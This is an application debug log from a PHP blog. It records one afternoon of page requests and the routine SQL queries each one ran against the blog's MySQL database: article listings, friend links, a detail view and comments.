---------------------------------------------------------------
[2019-05-07T17:26:27+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001322s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002148s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000518s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001905s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000558s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002161s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000658s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000500s ]
---------------------------------------------------------------
[2019-05-07T17:26:28+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001295s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001989s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000481s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000816s ]
---------------------------------------------------------------
[2019-05-07T17:26:28+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001076s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001785s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000462s ]
---------------------------------------------------------------
[2019-05-07T17:26:29+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001057s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002070s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000490s ]
---------------------------------------------------------------
[2019-05-07T17:26:33+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001006s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002194s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000632s ]
---------------------------------------------------------------
[2019-05-07T17:26:34+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000848s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001746s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000446s ]
---------------------------------------------------------------
[2019-05-07T17:27:22+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001420s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002498s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000615s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001574s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000548s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000525s ]
---------------------------------------------------------------
[2019-05-07T17:27:23+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.003434s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.003293s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000611s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000721s ]
---------------------------------------------------------------
[2019-05-07T17:27:24+08:00] 172.18.0.2 GET blog/index/list?type=1&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001244s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002248s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 1  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000592s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 1  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000473s ]
---------------------------------------------------------------
[2019-05-07T17:27:24+08:00] 172.18.0.2 GET blog/index/list?type=2&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001361s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002231s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 2  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000592s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 2  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000624s ]
---------------------------------------------------------------
[2019-05-07T17:27:25+08:00] 172.18.0.2 GET blog/index/list?type=3&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001122s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002301s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 3  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000616s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 3  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000536s ]
---------------------------------------------------------------
[2019-05-07T17:27:25+08:00] 172.18.0.2 GET blog/index/list?type=4&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001252s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001905s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `type_id` = 4  AND `is_delete` = 0 LIMIT 1 [ RunTime:0.000439s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `type_id` = 4  AND `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000811s ]
---------------------------------------------------------------
[2019-05-07T17:27:29+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001188s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002010s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000518s ]
---------------------------------------------------------------
[2019-05-07T17:27:29+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001114s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002003s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000708s ]
---------------------------------------------------------------
[2019-05-07T17:27:44+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001186s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002033s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000516s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001619s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000562s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000394s ]
---------------------------------------------------------------
[2019-05-07T17:27:45+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.002357s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002494s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000502s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000621s ]
---------------------------------------------------------------
[2019-05-07T17:33:45+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.004553s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002170s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.005010s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001965s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000539s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.001331s ]
---------------------------------------------------------------
[2019-05-07T17:33:45+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.000824s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001840s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.001435s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000685s ]
---------------------------------------------------------------
[2019-05-07T17:39:22+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001091s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002276s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000500s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002233s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000532s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001833s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000749s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000439s ]
---------------------------------------------------------------
[2019-05-07T17:39:23+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001087s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.004227s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000541s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000636s ]
---------------------------------------------------------------
[2019-05-07T17:46:42+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000965s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002108s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000448s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001511s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000483s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000425s ]
---------------------------------------------------------------
[2019-05-07T17:46:45+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.002164s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002414s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.001002s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000719s ]
---------------------------------------------------------------
[2019-05-07T17:46:49+08:00] 172.18.0.2 GET blog/index/list?type=0&page=2
[ sql ] [ DB ] CONNECT:[ UseTime:0.001759s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002604s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 10,10 [ RunTime:0.000875s ]
---------------------------------------------------------------
[2019-05-07T17:46:57+08:00] 172.18.0.2 GET blog/detail/index?id=7
[ sql ] [ DB ] CONNECT:[ UseTime:0.001348s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002347s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`cont`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type_id`,`type` FROM `article` `a` WHERE  `is_delete` = 0  AND `id` = 7 LIMIT 1 [ RunTime:0.044524s ]
[ sql ] [ SQL ] UPDATE `article`  SET `see_num` = `see_num` + 1  WHERE  `is_delete` = 0  AND `id` = 7 [ RunTime:0.082350s ]
---------------------------------------------------------------
[2019-05-07T17:46:57+08:00] 172.18.0.2 GET blog/detail/getArgue?id=7
[ sql ] [ DB ] CONNECT:[ UseTime:0.000952s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_argue` [ RunTime:0.001707s ]
[ sql ] [ SQL ] SELECT * FROM `article_argue` WHERE  `article_id` = 7  AND `is_delete` = 0 [ RunTime:0.000437s ]
---------------------------------------------------------------
[2019-05-07T17:47:02+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001188s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002153s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000640s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002138s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000665s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000655s ]
---------------------------------------------------------------
[2019-05-07T17:47:02+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001586s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002906s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000693s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000870s ]
---------------------------------------------------------------
[2019-05-07T18:14:14+08:00] 241.203.52.27 GET blog/index.php
[ sql ] [ DB ] CONNECT:[ UseTime:0.001153s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001787s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000367s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001409s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000536s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001516s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000512s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000576s ]
---------------------------------------------------------------
[2019-05-07T18:28:23+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000956s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001907s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000464s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001376s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000436s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001461s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000464s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000421s ]
---------------------------------------------------------------
[2019-05-07T18:28:23+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001274s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001858s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000565s ]
---------------------------------------------------------------
[2019-05-07T18:28:24+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001063s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001771s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000525s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000617s ]
---------------------------------------------------------------
[2019-05-07T18:28:49+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001131s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001985s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000474s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001777s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000639s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000546s ]
---------------------------------------------------------------
[2019-05-07T18:28:49+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.000970s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001977s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000444s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000531s ]
---------------------------------------------------------------
[2019-05-07T18:41:28+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001293s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.003822s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000571s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002263s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000580s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001885s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000740s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000478s ]
---------------------------------------------------------------
[2019-05-07T18:41:28+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001604s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002525s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000605s ]
---------------------------------------------------------------
[2019-05-07T18:41:29+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001460s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002646s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000595s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000757s ]
---------------------------------------------------------------
[2019-05-07T18:41:49+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001022s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001747s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000447s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001685s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000473s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000522s ]
---------------------------------------------------------------
[2019-05-07T18:41:49+08:00] 172.18.0.2 GET blog/index/list?type=0&page=1
[ sql ] [ DB ] CONNECT:[ UseTime:0.001110s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002203s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `article` `a` WHERE  `is_delete` = 0 LIMIT 1 [ RunTime:0.000576s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `to_top` DESC,`create_time` DESC LIMIT 0,10 [ RunTime:0.000795s ]
---------------------------------------------------------------
[2019-05-07T19:02:33+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001770s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001969s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000437s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002005s ]
